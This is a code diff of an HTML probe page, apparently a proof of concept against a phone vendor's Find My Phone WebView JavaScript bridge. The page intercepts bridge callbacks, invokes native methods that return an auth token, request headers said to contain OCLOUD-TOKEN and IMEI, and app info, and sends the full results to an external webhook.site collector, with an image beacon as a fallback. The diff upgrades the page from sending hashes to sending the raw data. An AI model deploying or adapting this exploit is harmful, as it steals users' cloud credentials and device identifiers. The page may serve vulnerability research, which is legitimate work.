@@ -2,87 +2,85 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>FMP_WEBHOOK_INIT</title>
+<title>FMP_PROBE_INIT</title>
 </head>
 <body>
-<h1>FMP_WEBHOOK_BRIDGE_PROBE</h1>
+<h1>FMP Bridge Probe</h1>
+<pre id="result" style="word-break:break-all;font-size:12px;">waiting...</pre>
 <script>
 (function () {
   const COLLECTOR = "https://webhook.site/59dbb195-25a2-4ae1-a6b3-52f1a40cd320";
-  const marker = "FMP_WEBHOOK_" + Date.now();
-
-  function hash32(s) {
-    s = String(s || "");
-    let h = 2166136261;
-    for (let i = 0; i < s.length; i++) {
-      h ^= s.charCodeAt(i);
-      h = Math.imul(h, 16777619);
-    }
-    return (h >>> 0).toString(16);
-  }
+  const marker = "FMP_" + Date.now();
 
   function safeString(x) {
-    try {
-      if (typeof x === "string") return x;
-      return JSON.stringify(x);
-    } catch (e) {
-      return String(x);
-    }
+    try { return typeof x === "string" ? x : JSON.stringify(x); }
+    catch (e) { return String(x); }
   }
 
-  function beacon(label, data) {
+  // 把实际数据写进 title + DOM + beacon
+  function report(label, data) {
     const s = safeString(data);
-    const bridgeType = typeof window.HeytapNativeApi;
-    const jsapiType = typeof window.HeytapJsApi;
-    const len = s.length;
-    const hash = hash32(s);
+    const preview = s.substring(0, 300);
 
-    document.title = label + "|bridge=" + bridgeType + "|len=" + len + "|hash=" + hash;
+    // 1. title（uiautomator 可读）
+    document.title = label + "|" + preview;
 
-    try {
-      fetch(
-        COLLECTOR +
-        "?m=" + encodeURIComponent(marker) +
-        "&label=" + encodeURIComponent(label) +
-        "&bridge=" + encodeURIComponent(bridgeType) +
-        "&hasHeytapJsApi=" + encodeURIComponent(jsapiType) +
-        "&len=" + encodeURIComponent(String(len)) +
-        "&hash=" + encodeURIComponent(hash) +
-        "&href=" + encodeURIComponent(location.href)
-      ).catch(function(){});
-    } catch (e) {}
+    // 2. DOM（uiautomator dump 可读）
+    var el = document.getElementById("result");
+    if (el) el.textContent += "\n\n[" + label + "]\n" + s;
+
+    // 3. fetch 发全量数据
+    var url = COLLECTOR
+      + "?m="     + encodeURIComponent(marker)
+      + "&label=" + encodeURIComponent(label)
+      + "&len="   + encodeURIComponent(String(s.length))
+      + "&data="  + encodeURIComponent(s.substring(0, 2000));
+    try { fetch(url).catch(function(){}); } catch(e) {}
+
+    // 4. Image beacon 兜底（fetch 被拦截时用这个）
+    try { new Image().src = url; } catch(e) {}
   }
 
-  beacon("PAGE_JS_STARTED", "init");
+  report("PAGE_LOADED", "bridge=" + typeof window.HeytapNativeApi);
 
+  // 拦截异步回调
   window.HeytapJsApi = window.HeytapJsApi || {};
-  const oldCallback = window.HeytapJsApi.callback;
-  window.HeytapJsApi.callback = function (id, result) {
-    beacon("CALLBACK_" + id, result);
-    try {
-      if (typeof oldCallback === "function") oldCallback.apply(this, arguments);
-    } catch (e) {}
+  var oldCb = window.HeytapJsApi.callback;
+  window.HeytapJsApi.callback = function(id, result) {
+    report("CALLBACK_" + id, result);   // ← 实际数据在这里
+    if (typeof oldCb === "function") {
+      try { oldCb.apply(this, arguments); } catch(e) {}
+    }
   };
 
   setTimeout(function () {
-    beacon("BRIDGE_CHECK", typeof window.HeytapNativeApi);
-
-    if (typeof window.HeytapNativeApi !== "undefined") {
-      try {
-        const r1 = window.HeytapNativeApi.invoke("find_phone_client.getToken", "{}", "cb_token");
-        beacon("INVOKE_getToken_RETURN", String(r1));
-      } catch (e) {
-        beacon("INVOKE_getToken_ERR", e && e.stack ? e.stack : e);
-      }
-
-      try {
-        const r2 = window.HeytapNativeApi.invoke("find_phone_client.getHeaderJson", "{}", "cb_header");
-        beacon("INVOKE_getHeaderJson_RETURN", String(r2));
-      } catch (e) {
-        beacon("INVOKE_getHeaderJson_ERR", e && e.stack ? e.stack : e);
-      }
+    if (typeof window.HeytapNativeApi === "undefined") {
+      report("ERROR", "HeytapNativeApi not found");
+      return;
     }
-  }, 1000);
+
+    // getToken
+    try {
+      window.HeytapNativeApi.invoke(
+        "find_phone_client.getToken", "{}", "cb_token"
+      );
+    } catch(e) { report("getToken_ERR", String(e)); }
+
+    // getHeaderJson（含 OCLOUD-TOKEN / OCLOUD-IMEI）
+    try {
+      window.HeytapNativeApi.invoke(
+        "find_phone_client.getHeaderJson", "{}", "cb_header"
+      );
+    } catch(e) { report("getHeaderJson_ERR", String(e)); }
+
+    // getAppInfo
+    try {
+      window.HeytapNativeApi.invoke(
+        "find_phone_client.getAppInfo", "{}", "cb_appinfo"
+      );
+    } catch(e) { report("getAppInfo_ERR", String(e)); }
+
+  }, 1500);
 })();
 </script>
 </body>
